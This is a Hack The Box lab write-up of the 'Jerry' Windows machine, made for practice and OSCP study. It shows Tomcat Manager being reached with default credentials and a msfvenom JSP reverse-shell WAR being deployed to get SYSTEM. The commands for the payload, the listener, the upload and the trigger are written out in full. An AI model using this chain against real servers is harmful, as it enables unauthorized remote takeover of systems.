# Jerry (HTB)

> Platform: Hack The Box  
> OS: Windows  
> Difficulty: Easy  
> Result: SYSTEM

---

## Attack Chain

```text
Reconnaissance
├── nmap -p- --min-rate 5000 → 8080 (Apache Tomcat/Coyote JSP engine 1.1)
└── /manager/html exposed (401 Unauthorized, Basic realm="Tomcat Manager Application")

Foothold (Default Credentials)
├── Default creds tomcat:<PASSWORD> on /manager/html → 200 OK
├── msfvenom -p java/jsp_shell_reverse_tcp → shell.war
├── curl -u tomcat:<PASSWORD> --upload-file shell.war → deploy at /shell
└── Trigger JSP payload → reverse shell as NT AUTHORITY\SYSTEM

Flags
├── C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
├── user.txt → <USER_FLAG>
└── root.txt → <ROOT_FLAG>
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

Jerry is a straightforward Windows machine hosting an Apache Tomcat 7.0.88 instance. The Tomcat Manager application is protected by default credentials (`tomcat:<PASSWORD>`), which are well-documented in Tomcat's own configuration examples. Once authenticated, the manager allows deploying arbitrary WAR (Web Application Archive) files. By uploading a malicious WAR containing a JSP reverse shell, an attacker gains code execution. Because Tomcat runs with high privileges on this host, the shell is obtained as `NT AUTHORITY\SYSTEM`.

---

## Reconnaissance

### Port Scan

```bash
ports=$(nmap -p- --min-rate=5000 -T4 -Pn -n jerry.htb -oG - | awk '/open/{for(i=4;i<=NF;i++){split($i,a,"/"); if(a[2]=="open") printf a[1]","}}' | sed 's/,$//'); echo "$ports"
```

```
8080
```

```bash
nmap -sC -sV -Pn -n -p 8080 jerry.htb
```

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

The service is Apache Tomcat version 7.0.88. The web interface reveals the manager and host-manager applications.

### Web Enumeration

Navigating to `http://jerry.htb:8080/` shows the default Tomcat page. The `/manager/html` endpoint requires authentication:

```bash
curl -s -i http://jerry.htb:8080/manager/html | head -10
```

```
HTTP/1.1 401 Unauthorized
Server: Apache-Coyote/1.1
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

This confirms the Tomcat Manager exists and is protected by Basic authentication.

---

## Foothold

No CVE (custom vulnerability) - the Apache Tomcat Manager is configured with default credentials `tomcat:<PASSWORD>`.

### Default Credentials

Tomcat's own documentation and error messages sometimes reference this credential pair as an example. Attempting to log in to `/manager/html` with `tomcat:<PASSWORD>` grants access:

```bash
curl -s -i -u tomcat:<PASSWORD> http://jerry.htb:8080/manager/html | head -10
```

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=<SESSION_ID>; Path=/manager; HttpOnly
Content-Type: text/html;charset=utf-8
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### WAR Deployment

The Manager interface provides a "Deploy" section that accepts `.war` files. Generate a malicious WAR file using `msfvenom`:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.76 LPORT=4444 -f war -o shell.war
```

```
Payload size: 1091 bytes
Final size of war file: 1091 bytes
Saved as: shell.war
```

Start a listener:

```bash
nc -lvnp 4444
```

Deploy the WAR via the Manager:

```bash
curl -u tomcat:<PASSWORD> --upload-file shell.war "http://jerry.htb:8080/manager/text/deploy?path=/shell&update=true"
```

```
OK - Deployed application at context path /shell
```

Identify the JSP file inside the archive:

```bash
jar tf shell.war
```

```
WEB-INF/
WEB-INF/web.xml
afhxosamxq.jsp
```

Trigger the payload by requesting the JSP file:

```bash
curl http://jerry.htb:8080/shell/afhxosamxq.jsp
```

The listener receives a connection:

```
connect to [10.10.15.76] from (UNKNOWN) [10.129.136.9] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Privilege Escalation

No privilege escalation is required. The Tomcat service runs as `NT AUTHORITY\SYSTEM`, so the reverse shell is already running with the highest privileges on the host.

```cmd
whoami
```

```
nt authority\system
```

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

```
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Flags

Both flags are located in `C:\Users\Administrator\Desktop\flags\`:

```cmd
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
```

```
user.txt
<USER_FLAG>

root.txt
<ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Flags

| Flag | Value          |
|------|----------------|
| User | `<USER_FLAG>`  |
| Root | `<ROOT_FLAG>`  |

---

## Key Takeaways

- **Default credentials are a critical risk.** The `tomcat:<PASSWORD>` pair is documented in Tomcat's own examples; leaving it unchanged on an exposed manager interface is equivalent to no authentication.
- **WAR deployment is a built-in feature, not a vulnerability.** The Tomcat Manager is designed to deploy applications. If an attacker gains access, this feature becomes the exploitation vector.
- **Tomcat often runs with high privileges on Windows.** Gaining a shell via Tomcat frequently results in `SYSTEM`, bypassing the need for local privilege escalation.
- **Both flags in one file.** Jerry places both user and root flags in a single file (`2 for the price of 1.txt`), a rare convenience for the attacker.